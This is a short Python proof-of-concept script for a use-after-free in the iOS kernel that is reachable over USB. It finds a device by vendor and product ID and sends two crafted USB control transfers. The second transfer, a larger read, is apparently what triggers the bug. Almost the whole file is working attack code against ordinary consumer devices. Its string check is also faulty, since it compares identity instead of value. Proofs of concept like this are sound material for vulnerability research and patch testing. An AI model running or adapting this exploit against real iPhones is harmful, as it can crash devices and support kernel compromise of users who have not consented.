#!/usr/bin/env python3
import sys
import time
import usb.core
import binascii

def banner():
  print('PoC for iOS Kernel UaF, reachable through USB by @RazMashat, contributions from @userlandkernel')
  print('Original bug by @userlandkernel and @posixninja')
  print('(C) All rights reserved, Minerva Mobile Security & Joshua Hill')
  print(' ')

def setup():
  sys.tracebacklimit = 0 #to hide info
  
def usage():
  print('Example usage: ./poc.py 05ac:12a8')
  
def poc(device):
	print('Preparing the first read...')

	res = ""
	rt = 0
	r = 0x6
	v = 0x30c
	i = 0x409
	size = 0xa
	size1= 0x64

	print('Reading for the first time...')
	res = device.ctrl_transfer(rt|0x80, r, v, i, size,timeout=250) #should always return 40035000540050002000
	res = binascii.hexlify(res)
	if res is not "40035000540050002000":
		print("Magic returned is not PTP? PoC might fail.")
	print('First read done. PoC should succeed now if the PTP magic got returned: ')
  
	try:
		res = device.ctrl_transfer(rt|0x80, r, v, i, size1,timeout=250)
	except Exception as e:
		print('Caught USB error, which is normal. Just re-attach the device.')

	print('PoC done deattach device')
  
def main():
  setup()
  banner()

  if len(sys.argv) <= 1:
    usage()
    exit()
    
  arg = sys.argv[1].split(':')
  
  if len(arg) <= 1:
  	usage()
  	exit()

  vid = int(arg[0], 16)
  pid = int(arg[1], 16)
  
  print('Looking for the USB Device...')
  
  device = usb.core.find(idVendor=vid, idProduct=pid)
  if device is not None:
    print('Found the specified device')
  else:
    print('Could not find the device specified ('+str(hex(vid))+', '+str(hex(pid))+').')
    print('Please make sure to specify VID:PID correctly.')
    exit()

  poc(device)

if __name__ == "__main__":
	main()
